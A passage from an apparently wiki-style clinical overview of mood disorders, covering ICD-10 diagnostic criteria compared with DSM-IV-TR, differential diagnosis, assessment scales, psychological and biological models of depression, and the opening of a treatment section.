D. Most commonly used exclusion clause. The episode is not attributable to psychoactive substance use (F10-F19) or to any organic mental disorder (in the sense of F00-F09).

F30.20: '''With mood-congruent psychotic symptoms''' (such as grandiose delusions or voices telling the individual that he or she has superhuman powers)

F30.21: '''With mood-incongruent psychotic symptoms''' (such as voices speaking to the individual about affectively neutral topics, or delusions of reference or  persecution)

F30.8: '''Other manic episodes'''

F30.9: '''Manic episode, unspecified'''

The DSM-IV-TR definition of the manic episode does not include a specific criterion for sexual behavior and condenses three ICD-10 criteria (#1, 4 and 8) into two. In essence the definitions are almost identical also requiring the same time duration. However, while in the ICD-10 the definition of hypomania requires a different set of criteria, in  DSM-IV-TR hypomania differs from mania only in the duration which is at least 4 days and in the criterion suggesting a milder impairment in comparison to mania. Maybe the ICD-10 definition includes some cases which could be subthreshold for DSM-IV-TR. The DSM-IV-TR includes criteria concerning the impairment severity and suggests that hypomania is a milder condition which however, is clearly different from the normal condition of the person and is observable by others. It also includes a note that hypomania caused by any somatic antidepressant treatment should not count towards the diagnosis of a bipolar disorder.

'''C. MIXED EPISODE'''

F38.0: '''Mixed affective episode'''

A. The episode is characterized by either a mixture or a rapid alternation (i.e., within a few hours) of hypomanic, manic, and depressive symptoms.

B. Both manic and depressive symptoms must be prominent most of the time during a period of at least 2 weeks.

The DSM-IV-TR definition demands the patient fulfills for at least 1 week the criteria both for a major depressive and a manic episode, thus this definition is far more rigid. Taking into account the fact that a significant number of patients might fulfill the ICD-10 criteria for mixed episode, but not the respective DSM-IV-TR definition, this difference in classification could make classifications by the two systems to deviate significantly. Both systems classify &quot;ultra-rapid cycling&quot; as mixed episodes.

On the basis of the existence or not of hypomanic, manic, depressive and mixed episodes and accompanying features and longitudinal course, the ICD-10 recognizes the following disorders:

'''D. DISORDERS'''

F33: '''Recurrent depressive disorder'''

* current episode mild, with/without somatic syndrome
* current episode moderate, with/without somatic syndrome
* current episode severe with/without mood-congruent/incongruent psychotic symptoms
* currently in remission
* Other recurrent depressive disorders
* Recurrent depressive disorder, unspecified

F31: '''Bipolar affective disorder'''
* current episode hypomanic
* current episode manic with/without mood-congruent/incongruent psychotic symptoms
* current episode moderate or mild depression with/without somatic syndrome
* current episode severe depression with/without mood-congruent/incongruent psychotic symptoms
* current episode mixed
* currently in remission
* Other bipolar affective disorders
* Bipolar affective disorder, unspecified

F34.0: '''Cyclothymia'''

A. There must have been a period of at least 2 years of instability of mood involving several periods of both depression and hypomania, with or without intervening periods of normal mood.

B. None of the manifestations of depression or hypomania during such a 2-year period should be sufficiently severe or long-lasting to meet criteria for manic episode or depressive episode (moderate or severe); however, manic or depressive episode(s) may have occurred before, or may develop after, such a period of persistent mood instability.

C. During at least some of the periods of depression at least three of the following should be present:

(1) reduced energy or activity;

(2) insomnia;

(3) loss of self-confidence or feelings of inadequacy;

(4) difficulty in concentrating;

(5) social withdrawal;

(6) loss of interest in or enjoyment of sex and other pleasurable activities;

(7) reduced talkativeness;

(8) pessimism about the future or brooding over the past.

D. During at least some of the periods of mood elevation at least three of the following should be present:

(1) increased energy or activity;

(2) decreased need for sleep;

(3) inflated self-esteem;

(4) sharpened or unusually creative thinking;

(5) increased gregariousness;

(6) increased talkativeness or wittiness;

(7) increased interest and involvement in sexual and other pleasurable activities;

(8) overoptimism or exaggeration of past achievements.

Note. If desired, time of onset may be specified as early (in late teenage or the 20s) or late (usually between age 30 and 50 years, following an affective episode).

F34.1: '''Dysthymia'''

A. There must be a period of at least 2 years of constant or constantly recurring depressed mood. Intervening periods of normal mood rarely last for longer than a few weeks, and there are no episodes of hypomania.

B. None, or very few, of the individual episodes of depression within such a 2-year period should be sufficiently severe or long-lasting to meet the criteria for recurrent mild depressive disorder (F33.0).

C. During at least some of the periods of depression at least three of the following should be present:

(1) reduced energy or activity;

(2) insomnia;

(3) loss of self-confidence or feelings of inadequacy;

(4) difficulty in concentrating;

(5) frequent tearfulness;
(6) loss of interest in or enjoyment of sex and other pleasurable activities;

(7) feeling of hopelessness or despair;

(8) a perceived inability to cope with the routine responsibilities of everyday life;

(9) pessimism about the future or brooding over the past;

(10) social withdrawal;

(11) reduced talkativeness.

Note. If desired, time of onset may be specified as early (in late teenage or the 20s) or late (usually between age 30 and 50 years, following an affective episode).

F34.8: '''Other persistent mood [affective] disorders'''

This is a residual category for persistent affective disorders that are not sufficiently severe or long-lasting to fulfill the criteria for cyclothymia (F34.0) or dysthymia (F34.1) but that are nevertheless clinically significant. Some types of depression previously called &quot;neurotic&quot; are included here, provided that they do not meet the criteria for either cyclothymia (F34.0) or dysthymia (F34.1) or for depressive episode of mild (F32.0) or moderate (F32.1) severity.

F34.9: '''Persistent mood [affective] disorder, unspecified'''

F38: '''Other mood [affective] disorders'''

There are so many possible disorders that could be listed under F38 that no attempt has been made to specify criteria, except for mixed affective episode (F38.00) and recurrent brief depressive disorder (F38.10). Investigators requiring criteria more exact than those available in Clinical descriptions and diagnostic guidelines should construct them according to the requirements of their studies.

F38.10: '''Recurrent brief depressive disorder'''

A. The disorder meets the symptomatic criteria for mild (F32.0), moderate (F32.1), or severe (F32.2) depressive episode.

B. The depressive episodes have occurred about once a month over the past year.

C. The individual episodes last less than 2 weeks (typically 2–3 days).

D. The episodes do not occur solely in relation to the menstrual cycle.

F38.8: '''Other specified mood [affective] disorders'''

This is a residual category for affective disorders that do not meet the criteria for any other categories F30-F38.1 above.

There are significant differences in the way the two systems conceptualize bipolar illness apart from the differences that occur because of different definitions of mood episodes. The DSM-IV-TR separates Bipolar I (which includes manic episodes) and Bipolar II (which includes hypomanic but not manic episodes) disorders on the base of the longitudinal history of the disorder. On the contrary, the ICD-10 distinguishes them only concerning the &quot;current episode&quot; irrespective of past episodes.  
The greatest difference concerning cyclothymia is that ICD-10 demands the presence of 3 out of 8 depressive or manic symptoms during the downs and up, while the DSM-IV-TR refers only to depressive and hypomanic symptoms from the list of criteria for major depressive and hypomanic episodes without any threshold. On the contrary the separate lists of symptoms criteria suggested by the ICD-10 differ significantly from the respected list for depressive episodes and hypomanic episodes and thus eventually the definitions of cyclothymia of the two classification systems differ significantly.
The definition of DSM-IV-TR concerning dysthymia differs significantly from that of ICD-10 since it demands the presence of 2 out of 6 criteria in comparison to 3 out of 11 for ICD-10. The DSM-IV-TR criteria include appetite and weight changes and  hypersomnia and not only insomnia. The ICD-IV-TR largely duplicates criteria although depending on the definition overlapping is not complete always (e.g., &quot;depressed&quot; and &quot;frequent tearfulness;&quot; &quot;pessimism&quot; and &quot;hopelessness&quot;). The DSM-IV-TR definition considers dysthymia to be a chronic mild form of depression while the ICD-10 stresses the cognitive and interpersonal impairment.

==== Assessment ====

Mood disorders should be differentially diagnosed from a number of other morbid conditions, both psychiatric and non-psychiatric. 
      
Several mental disorders including alcohol and substance use disorders, normal bereavement, depression in the frame of schizophrenia, anxiety disorders, personality disorders, dementia and a variety of general medical conditions that cause syndromes similar to depression should be differentiated from mood disorders. Also several drugs used for the treatment for a number of diseases might also cause depression. In general the prevailing opinion is that a missed diagnosis of mood disorder in favor of another mental diagnosis may mean that the patients does not receive proper treatment, which has serious consequences. 
      
Maybe the most important differential diagnosis should be made between mood and personality disorders. Since the state dependency of most personality features is well documented (Grilo et al. 2004; Grilo et al. 2005; Gunderson et al. 2004; McGlashan, 1986; McGlashan et al. 2005; Morey et al. 2004; Stone, 1993, 2005; Warner et al. 2004), clinicians should avoid putting this diagnosis in patients with an active mood disorder, even in cases this mood disorder is subthreshold. A dangerous stereotypical thinking leads clinicians to suggest that because a patient does not respond adequately to usual treatment the disorder is personality-based. This is especially problematic concerning subthreshold or non-classic mixed clinical pictures which are relatively refractory to treatment and cause despair to the therapist.  
      
Normal bereavement appears normally in persons experiencing the loss of a significant other and consists of several depressive symptoms during the first 1-2 years after the loss. But only around 5% will eventually progress to a depressive disorder. Normal bereavement is generally contrasted with depression because reactivity to the environmental stimuli is preserved, the disability if any is mild and no severe psychopathology (delusions or hallucination or true suicidal ideation) is present. 
      
Anxiety symptoms commonly occur in mood patients, including panic attacks, fears, and obsessions. Longitudinal data suggest that although the depressive symptoms tend to remit by passing the time, the anxiety symptoms persist. Because anxiety disorders rarely appear after the age of 40 for the first time, a late appearance of significant anxiety should be considered to be a sign of depression. Transient and periodic monosymptomatic phobic and obsessional states that do not fulfill criteria for a formal disorder as conceptualized in either classification system should also be considered as reflecting an underlying mood disorder and should be treated accordingly. 
      
Somatic complaints especially in depression might also reflect an underlying physical illness rather than a somatization mechanism. The somatic disorders most commonly related to depression are Multiple Sclerosis, Parkinson's disease, head trauma, epilepsy, sleep apnea, cerebral tumors, vascular encephalopathy, chronic fatigue syndrome, some collagen disorders like rheumatoid arthritis and lupus erythematosus and various neoplastic conditions like abdominal malignancies (especially in the pancreas) and disseminated carcinomatosis. Also there is a number of abnormal endocrine conditions including hypo- and hyperthyroidism, hyperparathyroidism, hypopituitarism, Addison's disease, Cushing's disease and diabetes mellitus, several infections like general paresis (tertiary syphilis), toxoplasmosis, influenza, viral pneumonia, viral hepatitis, infectious mononucleosis and AIDS, and nutritional conditions like pellagra and pernicious anemia. 
      
A number of pharmacological agents used for the treatment of various diseases could cause depression or a depressive-like condition. These include a-methyldopa, anticholinesterase insecticides, cimetidine, cycloserine, indomethacin, mercury, phenothiazine antipsychotic drugs, reserpine, steroidal contraceptives, thallium, vinblastine and vincristine 
Withdrawal from agents like amphetamine, alcohol or sedative-hypnotics could also be the cause of depression.
      
In geriatric patients the differentiation between depressive pseudodementia and degenerative dementia is vital and is done by the neuropsychological profile of the patient as well as from the clinical course which in pseudodementia cases includes an acute onset without prior cognitive disorder, a personal or family history of affective illness, circumscribed memory deficits and an unstable cognitive dysfunction that can be reversed with proper coaching. 
      
The need for the differential diagnosis of mood disorders from the above mentioned conditions makes important for the clinician to obtain a variety of laboratory examination data including standard blood and biochemical tests, EEG, ECG, thyroid function tests and in depending on availability and cost even brain MRI and in late onset cases indices assessing malignancy.
      
There are a large number of neuropsychological and psychometric tools available for the assessment of mood disorders and the clinician can choose which to use on the basis of his training and specific needs. However, a basic list includes the following tools:
      
Psychometric Tools 
      
*Visual Analogue Scale (Rosenthal, Goldfarb, Carlson, Sagi, &amp; Balaban, 1987): This is a very simple method, according to which, the examiner or the patient himself is asked to determine the quantity of the symptomatology on a bar 100 mm in length.  One end of the bar is defined as &quot;lack of depression&quot; (0 mm) and the opposite one as &quot;profound depression&quot; (100 mm). The distance from the beginning (0 mm) is considered as the &quot;degree&quot; of depression. This method is has been in existence since 1921.  A positive relationship between the subject’s ratings, the examiners’ opinion, and the score on the Beck Depression Inventory is reported. Today, it is considered somewhat outdated and not suitable for research purposes. 
*Hamilton Depression Rating Scale (HDRS) (Hamilton, 1960): This is the most widely known and used scale worldwide. It is examiner-rated. The basic scale includes 17 items, some of them assessing somatic symptoms, other assess anxiety or vegetative function and others could be contaminated by medication side effects. Therefore although it is a comprehensive scale, its use of this scale in somatic patients or the elderly patients has some limitations. It also under-assesses atypical depressive patients.
*Beck Depression Inventory (BDI-I) (Beck, Ward, Mendelson, Mock, &amp; Erbaugh, 1961): This is a widely used self-report scale that measures the thought content, or cognitive aspect of depression.   It includes 21 items. Its properties when used in somatic patients or the elderly are less well known. A revised version (BDI-II) (Beck, Steer, Ball, &amp; Ranieri, 1996) which is adjusted to modern classification is also available.
*Zung Depression Rating Scale (ZDRS) (Zung, 1965): This is an old self-report scale which reflects an older concept of depression that dominated during the 60s, and might not produce reliable and valid results in somatic patients and geriatric populations. It also under-assesses atypical depressive patients.
*Montgomery-Asberg Depression Rating Scale (MADRS) (Montgomery &amp; Asberg, 1979): This instrument was the product of the need for scales with high sensitivity to changes produced by antidepressant medication. It is rated by an examiner. As a result, it includes only 10 items and almost no &quot;somatic&quot; symptomatology. A significant drawback of this scale is that its content is restricted to those symptoms responsive to medication at the time of the design of the scale, and therefore it does not represent a global assessment of depression. Another drawback is that it was developed for use in younger and somatically healthy patients.    The content and method of development of the scale might make its application in somatic patients and elderly individuals problematic and its application in this population may lead to erroneous conclusions. 
*Geriatric Depression Scale (GDS) (Yesavage et al. 1982): It is the first scale especially designed for use in elderly populations.  It is a self-report scale however, sometimes it is necessary to administer it through an interviewer. It exists in a 30-item and a 15-item form. It focuses mainly on the psychological concern of the patient and the way he/she perceives life, avoiding the assessment of somatic complaints.  
*Center for Epidemiological Studies-Depression Scale (CES-D) (Radloff, 1977): It is a self-report instrument and one of the most widely used. It seems that it is this scale is least affected by somatic disorders and handicaps. It consists of 20 items. The validity of the CES-D might be compromised when used with somatic patients or elderly individuals, and modifications for its use in this population has been recommended.
*Young Mania Rating Scale (YMRS) (Young, Biggs, Ziegler, &amp; Meyer, 1978): The YMRS is an 11-item scale used to assess the severity of mania in patients with a diagnosis of bipolar disorder. It takes 15-30 minutes to complete by a trained examiner. It is a reliable easy to use and simple tool, widely used.  Some 4 items have double-rating which can lead to questions of reliability. 
*The Bech-Rafaelsen Mania Rating Scale (MRS) (Bech, Rafaelsen, Kramp, &amp; Bolwig, 1978): It consists of  11 items and assesses the severity of mania in bipolar patients. It is rated by an examiner.  
*General Assessment of Functioning) (GAF): This is a scale introduced by the DSM classification system, that assesses global functioning in the psychological, family, social and occupational spheres and attempts to localize it on a continuum from 0 (full decline of functioning, the patient is dangerous to self or others) to 100 (supreme level of functioning). It shares many characteristics with the visual analog scale, and represents a non-specific way to quantify everyday functioning, but with low reliability and accuracy. 
*General Assessment of Relational Functioning (GARF):  It can be used to assess the patient’s family or the general environment in which he/she lives.  
*Social and Occupational Functioning Assessment Scale (SOFAS):  This is a scale for the assessment of functioning in work place and in social situations. Both GARF and SOFAS are introduced by DSM-IV, and share characteristics with GAF. Their major difference is that they have a restricted field of functioning to assess. 
*Clinical Global Impression (CGI): This is a group of simple scales assessing symptom severity, treatment response and the efficacy of treatments in treatment studies of patients with mental disorders. They include the Clinical Global Impression - Severity scale (CGI-S) which is a 7-point scale, the Clinical Global Impression - Improvement scale (CGI-I) which is a 7 point scale and the Clinical Global Impression - Efficacy Index which is a 4 point X 4 point rating scale 
*TEMPS-A (Akiskal, Akiskal, Haykal, Manning, &amp; Connor, 2005), NEO-PI (Costa &amp; McCrae, 1997), TCI (Cloninger, Svrakic, &amp; Przybeck, 1993) and the MMPI-2 (Butcher, Graham, &amp; Fowler, 1991): They are self-report questionnaires that assess temperament, character and personality 

The literature suggests there is no significant difference among the various self-administered instruments assessing depression in terms of performance and overall sensitivity is around 84% and specificity around 72% (Fountoulakis, Bech et al. 2007; Mulrow et al. 1995). 

Neuropsychological Tools
      
The assessment of neurocognitive function is very important especially for psychogeriatric patients even in cases without observable symptoms or signs of &quot;organic&quot; disorder or dementia. Scales for rapid screening of cognitive disorder are the following: 

* Mini Mental Status Exam-(MMSE) (Folstein, Folstein, &amp; McHugh, 1975): It is a brief mental status examination designed to quantify cognitive status by assessing performance on the following cognitive domains: orientation, language, calculation, memory and visuospatial reproduction thus providing a brief measure of global cognitive functioning. 
*  The Cambridge Cognitive Examination For The Elderly-(CAMDEX) (Roth et al. 1986): It includes a large number of items covering almost every aspect of the patient's medical history as well as his/her family medical history. It also includes evaluation of the patients’ current condition concerning both physical and mental health. Sixty-eight of these items constitute the CAMCOG scale, which is the part of CAMDEX examining the patient's cognitive functions. The MMSE score is simultaneously obtained. CAMCOG includes eleven subscales. Each one evaluates a &quot;different&quot; cognitive function of the patient: Orientation, Language/Comprehension, Language/Expression, Remote Memory, Recent Memory, Learning, Attention, Praxis, Calculations, Abstract Thinking and Perception.
* Weschler Memory Scale-Revised (D'Elia, Satz, &amp; Schretlen, 1989) Maybe the most global and comprehensive scale for the assessment of memory. Its greatest drawback is that it is time consuming. It includes testing of Personal and current information, Orientation, Mental Control, Logical Memory, Digits forward and backward, Visual reproduction and Associated learning. 
* Weschler Adult Intelligence Scale - Revised (WAIS-R): The WAIS-R gives a global Intelligence Quotient (IQ)  and also two subscales: verbal and performance.  
* Clock Drawing Test (Sunderland et al. 1989): This is a simple test which demands the patient to draw a clock. It can be used as a screening tool especially for dementia. The test requires multiple cognitive functions to co-operate.
* Verbal Fluency Test : The test demands the patient to name as many objects and animals is able to within a time frame of 1 minute.
* Trail Making Test (Reitan, 1971): The first form of is test demands the patient to trail the sequence of numbers put at random places on paper by using a pencil, while the second form demands to alternate between numbers and letters randomly put on paper. The time needed to fulfill each of the two tasks is recorded. The test is an assessment of general mental function.

=== Pathogenesis ===

Today most mood disorders experts agree that mood disorders have both endogenous and exogenous components and in most patients they are both present. After the historical dualism suggested by Rene Descartes in the 17th century, only as recent as the early 20th century Adolf Meyer used the term &quot;psychobiology&quot; to emphasize that psychological and biological factors interact in the development of  mental disorders. The bio-psycho-social model has been proposed by Engel (Engel, 1977, 1980) and provides a non specific but inclusive theoretical framework in order to host all variables suggested by various approaches to cause depression.
      
===== Social Stressors =====

Although lay people and much of psychological theories attribute mood disorders to adverse life events, there are several studies which dispute the role stressful life events play in the development or the course of depression (Harkness &amp; Luther, 2001; E. Paykel, Rao, &amp; Taylor, 1984). But the sensitization of stress-responsive neurobiological systems as a possible consequence of early adverse experience has been more solidly implicated in the pathophysiology of mood and anxiety disorders. A history of childhood abuse per se may be related to increased neuroendocrine stress reactivity, which is further enhanced when additional trauma is experienced in adulthood (Heim et al. 2002). In this frame, depressed patients were reported to have higher perceptions of day-to-day stressors (hassles), reduced perception of uplifting events, excessive reliance on emotion-focused coping strategies, and diminished quality of life in comparison to controls. Among depressed patients the hassles, coping styles and some elements of quality of life were related to symptom severity, as well as treatment-resistance (Ravindran, Matheson, Griffiths, Merali, &amp; Anisman, 2002). The question that arises is whether this is a true fact or these patients (which have higher personality psychopathology and interpersonal rejection sensitivity) tend to over-report life events (Fountoulakis, Iacovides, Kaprinis, &amp; Kaprinis, 2006). 
      
Thus, many authors insist that psychosocial factors are relatively unimportant in the subsequent course of severe and recurrent depressions, in contrast to their contribution to onset of such depressions and subsequent outcome of milder depressions (Paykel, Cooper, Ramana, &amp; Hayhurst, 1996; Thomson &amp; Hendrie, 1972). 
      
===== Psychological Models of Mood Disorders =====
      
There are a number of psychological models proposed during the last 100 years to explain the pathogenesis of depression. The most important are the following:

1. Aggression-Turned-Inward Model: It has been proposed by Sigmund Freud and Karl Abraham on the basis of a &quot;metaphor&quot; from physics to psychology (&quot;hydraulic mind&quot;). According to this model, during the oral phase (that is, during the 12-18th months of life) disturbances in the relationship between the infant and the mother establish a vulnerability to develop depression. Then during the adult life, a real or imaginary loss leads to depression as the result of aggressive impulses turned inward and directed against the ambivalently loved internalized object which had been lost. The aim of that turned-inwards aggression was supposed to be the punishment of the love object which fails to fulfill the patient’s need to be loved. It is therefore accompanied by guilt which could lead to suicidal behavior. Later other authors proposed somewhat different versions of this model. The drawbacks of this model include that it represents a relatively closed circuit independent of the outside world, while the clinical fact is that many depressed patients openly express anger and hostility against others which is reduced after treatment, and that there are no evidence supporting the concept that expressing anger outwards has a therapeutic effect in the treatment of clinical depression behavior

2. Object Loss: The term refers to traumatic separation from significant objects of attachment. However, according to empirical research data, only a minority of no more than 10% of people experiencing bereavement will eventually manifest clinical depression. Thus the model includes two steps; an early one which includes significant loss during childhood thus creating a vulnerability which during the second step, that is significant loss during adult life, leads to clinical depression. This model fits better the data in comparison to the aggression-turned-inward and has some support by studies on primates although the latter point to a broad psychopathology rather than specifically depression.

3. Loss of Self-Esteem: Depression is considered to originate from the inability of the ego to give up unattainable goals and ideals resulting in a collapse of self-esteem. This model suggests that the narcissistic injury that destroys the patient’s self-esteem comes from the internalized values of the ego rather than the hydraulic pressure deriving from the id as proposed by the aggression-turned-inward model. In this frame the loss of self-esteem has a sociocultural and existential dimension and thus this theory is testable to a significant extent. The drawback of this theory is that both persons with low and high self esteem can develop depression or mania without any significant differences among them. 

4. Cognitive Model: The cognitive model was developed by Aaron Beck and suggests that thinking in a negative way is the core of clinical depression. According to this, depression is conceptualized in the frame of the &quot;cognitive triad.&quot; This triad proposes that patients conceive the self, the environment and the future in a negative depressive way (helplessness, negative and hopelessness). In the core there seems to be bias of the person in the way of thinking and interpreting which results in a profound negative attributional style (mental schemata) which is considered to be global, internal, and stable. The bias in the way of thinking is because of overgeneralization, magnification of negative events with a simultaneous minimization of positive events, arbitrary inference, and selective abstraction. Systematic errors in thinking, allow the persistence of negative schemas despite contradictory evidence. The major drawback of this model is the fact that it is based on retrospective observations of depressed patients, thus the negative triad could be simply subclinical manifestations of depression and not the cause of it. The major advantage is that it led to the first testable and practical psychotherapeutic approach which seems to be effective in a specific subgroup of patients. 

5. Learned Helplessness Model: This model is based on animal experiments and proposes that the depressive attitude is learned during past situations in which the person was not able to terminate or avoid undesirable or traumatic events. However, it seems that the learned helplessness paradigm is more general and refers to a broader mental condition (e.g, behavior, posttraumatic stress disorder etc.). It seems that past events could shape a personality profile which includes passivity, lack of hostility, and self-blame. However, this line of thinking could lead to the notion that depression and the behavior accompanying it should be considered to be a result of a masochistic lifestyle with manipulative behavioral patterns in order to handle interpersonal issues. Even more, recent animal research has implicated the importance of genetic factors in the vulnerability to learning to behave helplessly. 

6. Depression and Reinforcement: According to the reinforcement the behavior characteristic of depression develop because of a lack of appropriate rewards and with receipt of non-contingent rewards. This theory bridges personality, low self esteem and learned helplessness with the human social environment; however it seems more appropriate for the interpretation of social issues than clinical depression. A psychotherapeutic approach aiming to improve the patient’s social skills is based on this theory.

7. Psychological theories of Mania: Most theories view manic symptoms as a defense against an underlying depression with the use of a number of defense mechanisms like omnipotence, denial, idealization, and contempt. In this frame, the euphoric state of the patient is understood as a tendency to extinguish any unpleasant aspects of reality and to disregard for the problems of reality, even if the situation is tragic. Thus mixed episodes are easily psychodynamically understood, since as manic elements seen in depressed patients are considered to be defenses.

===== Biological Models of Mood Disorders =====

Data coming from animal experiments and models implicate the limbic-diencephalic brain in mood disorders and more specifically neurons containing serotonin and noradrenaline. Historically the monoamine deficiency hypothesis is based on data from the study of the cerebrospinal fluid (CSF) metabolites. According to this theory, there is a monoamine deficiency, especially norepinephrine (NE), in depression. Later, studies illustrated that this theory should also include serotonin (5-HT), leading to a broader theory regarding neurotransmission disorder in Central Nervous System (CNS) (Maas, 1975; Schildkraut, 1965; Van Praag &amp; Leijnse, 1963). Later, the cholinergic-noradrenergic imbalance hypothesis (Janowsky, el-Yousef, Davis, &amp; Sekerke, 1972) included acetycloline in a broader model for mood disorders. More complex models include state changes (depending on the polarity of the mood episode) in the excitatory amino acid function in specific areas of the cortex (Fountoulakis, Giannakopoulos, Kovari, &amp; Bouras, 2008).

However, in spite of decades of extensive research there is no definite proof for either a deficiency or an excess of either the quantity or the overall functioning of biogenic amines in specific brain structures. Even when these abnormalities were documented, it has been shown that they are neither necessary nor sufficient for the occurrence of mood disorders. In contrast, it seems that the neurotransmitter disorders recognized until today refer to a broader behavioral dysfunction which includes behavioral disinhibition, obsessive-compulsive symptoms, anxiety, eating disorders and substance and alcohol abuse as well as personality disorders. This is not peculiar since most classic animal models are in essence post-traumatic stress models and most biological psychoendocrinological markers are markers of stress-related somatic reactions. Recent research explores disturbances at the level of second messengers and close to DNA function with variable success but no definite conclusions. 

A number of biological markers have been developed so far but no one is proved so far strong enough for use in clinical practice. The dexamethasone-suppression test (DST) has been widely used for the study of hypothalamus-pituitary-adrenal (HPA) axis disorders in patients with depression (Evans &amp; Golden, 1987; Green &amp; Kane, 1983; Stokes et al. 1984). It requires the oral administration  of 1mg dexamethasone (a synthetic glucocorticoid) at 23:00 on day 1 and the assessment of cortisol levels at the same time, at 08:00, 16:00, and at 23:00 on day 2. A cortisol value of 5?g/dl, in at least one measurement in day 2, is considered to be the cut-off point between normal (suppressors) and pathological (non-suppressors). Longer protocols requiring higher dosage for dexamethasone and a 24 hour long assessment have also been suggested. The test presents a 67% sensitivity and 96% specificity in the diagnosis of melancholy in psychiatric inpatients. The results of the up to date research efforts report that DST presents results that are probably related with the severity of depression and the patient’s family history. Other psychoendocrinological markers are the TRH Stimulation Test (blunted thyroid-stimulating hormone response to thyrotropin-releasing hormone) (Kendler, Thornton, &amp; Gardner, 2000; Musselman &amp; Nemeroff, 1996), the fluramine and d-fenfluramine challenge tests which  (Di Renzo &amp; Amoroso, 1989; Fessler, Deyo, Meltzer, &amp; Miller, 1984; Garattini, Mennini, &amp; Samanin, 1987, 1989; Invernissi, Berettera, Garattini, &amp; Samanin, 1986; Ouattrone, Tedeschi, Aguglia, &amp; Scopacasa, 1983; Quattrone, Schettini, &amp; DiRenzo, 1979; Rowland &amp; Carlton, 1986; Siever &amp; Murphy, 1984; Zarifian, 1993) are supposed to reflect central serotonin activity (administration of 30 mg of the d-fenfluramine orally and measurement of prolactin plasma levels at the baseline and 60?, 120?, 180?, 240? and 300? after the administration), blunted growth hormone (GH) response to the a2-adrenergic receptor agonist clonidine (an index of noradrenergic dysregulation) and others. A non-endocrinological marker is based on EEG and concerns the observation that depressed patients are phase advanced in many biological rhythms, especially concerning the latency to the first rapid eye movement in sleep (shortened REM latency) (Kupfer, 1976). 
      
A possible comprehensive model could suggest that mood patients have a deficit in the adequate mobilization of neurotransmitters when facing continued or repeated stress, and as a result, through a &quot;kindling&quot; effect (Kendler et al. 2000; Post, Weiss, &amp; Pert, 1984, 1988; Post &amp; Weiss, 1989; Post, Susan, &amp; Weiss, 1992; Post &amp; Silberstein, 1994; Post &amp; Weiss, 1998), the mood change is intense, prolonged and not self-limited, and tends to be triggered by progressively unimportant events and finally automatically. Thus it is expected that an early application of treatment with antidepressants and psychotherapy could prevent neuroplastic changes and the long term worsening of the clinical course.
      
The data from family and twin studies argue strongly for the familial nature of mood disorders (Kendler, Pedersen, Johnson, Neale, &amp; Mathe, 1993; Sadovnick et al. 1994). However, so far the mode of genetic transmission remains elusive. Several studies have focused on a functional polymorphism in the promoter region of the serotonin transporter serotonin transporter gene (HTTLPR) which is supposed to moderate the influence of stressful life events on depression and the brain derived neurotrophic factor (BDNF) which is supposed to exert a prophylactic effect against neuronal toxicity induced by stress (Belmaker &amp; Agam, 2008; Caspi et al. 2003; Kato, 2007). The most possible model is a multifactorial-threshold model. The twin data suggest that genes account for 50-70% of the etiology of mood disorders.

=== Treatment ===
      
Mood disorders are not only formally distinguished into two major groups, that is unipolar and bipolar mood disorder, but also treatment differs between them. Even within the unipolar group different subcategories exist, that demand somewhat different treatment. Psychotherapy as monotherapy is generally reserved for milder cases while antidepressants are first choice for moderate to severe cases. Patients with psychotic features need adding antipsychotic. Bipolar patients need a core treatment with the so-called mood stabilizers and depending on the episode and the state of the clinical picture additional agents can be used. 
      
Treatment is artificially separated into acute face treatment and maintenance. During the acute-phase the therapist should decide where the patient should be treated (e.g., outpatient, inpatient, day hospital etc). The decision is based on the assessment of issues like the risk of suicide, the patient’s insight, comorbidity, severity of impairment and the psychosocial support available.  As a general rule, patients who respond to acute-phase treatment receive a similar treatment during the maintenance phase. During that phase, medication should be kept at the same dosage if possible.
      
===== Unipolar Mood Disorders =====

'''Psychotherapy'''

The first kind of available treatment for mood disorders was psychotherapy. Some kind of psychosocial, moral or psychotherapeutic intervention was available since antiquity; however only during the 20th century psychotherapy was systematically developed as a formal treatment. 
      
A variety of psychotherapies are today available and to some extend have a proven efficacy in the treatment of mood disorders. Although there are still psychoanalytical and psychodynamic-oriented approaches, today most professionals prefer the more pragmatic, short term and focused approaches of behavioral or cognitive therapy or utilize an eclectic approach.  
      
The evidence so far altogether seems enough to support the efficacy of psychotherapeutic strategies in mild and moderate depression but not in more severe cases. However, the evaluation of psychotherapies is not as good as that of antidepressants. Most psychotherapies, especially the psychodynamically oriented are not possible to be tested scientifically while the practical ones like cognitive and behavioral have not been tested under placebo conditions and it is doubtful this is possible (Cuijpers, van Straten, &amp; Warmerdam, 2007a, 2007b; Hegerl, Plattner, &amp; Moller, 2004; Paykel, 2007). Thus important questions remain concerning the use and usefulness of psychotherapy in mood disorders. Some authors suggest psychotherapies should be considered as equal alternatives to medication especially under the warning that antidepressants and maybe anticonvulsants provoke suicidality; however there are reports suggesting that even psychotherapy can also evoke suicidal thoughts (Moller, 1992). 
      
There are no established clinical predictors to guide the choice of a specific kind of psychotherapy for the individual patient. 

*Interpersonal therapy (ITP): It was developed by Gerald Klerman and Myrna Weissman and its basic concepts include accepting the patient to assume the sick role and focusing on improving the patient’s interpersonal functioning.  Since depression can cause interpersonal problems, and vice versa interpersonal problems can precipitate depression, IPT focuses on solving these problems. It is a short-term psychotherapy (12-16 weekly sessions) and the therapeutic goals include reducing depressive symptoms (by an educational approach), improving self-esteem and helping the patient to develop more-effective copying strategies concerning social and interpersonal relations. 

*Cognitive-behavioral therapy (CBT) was developed by Aaron Beck and is based on cognitive and behavioral psychology and the cognitive theory on the etiopathogenesis of depression. It aims at changing the way a person thinks and in this way it alleviates depression and prevents recurrence. It utilizes didactic methods and cognitive and behavioral techniques. The patient is encouraged to identify and challenge negative conditions, develop alternative, and more flexible cognitive schemas, and exhibit new behavioral patterns. It is a short-term, structured therapy and demands the active participation of the patient.

*The Behavioral therapy was developed by C.B. Ferster and is based on the work of B.F. Skinner, and the behavioral approach to the etiopathogenesis of depression.  It puts the emphasis on the relationship between an observable behavior and the conditions that control or determine it. It also stresses the importance of the role of rewards. A major goal is increasing the frequency of positive reinforcing and decrease negative thus improving social and interpersonal skills. 


'''Biological Treatment'''

The basis of &quot;biological&quot; treatment is antidepressants although Electro-Convulsive therapy (ECT) and total and partial sleep deprivation are also used in refractory cases. Other therapies which were used in the past and are considered to be effective, like insulin therapy, are no longer in use. The ability of psychiatrists to individualize treatment decisions and choose a specific antidepressant for a specific patient is poor and the choice is largely dependent on adverse effects and comorbid conditions. The therapeutic effect of antidepressants is evident after at least two weeks and therapy should be administered over the course months, or sometimes years. 
      
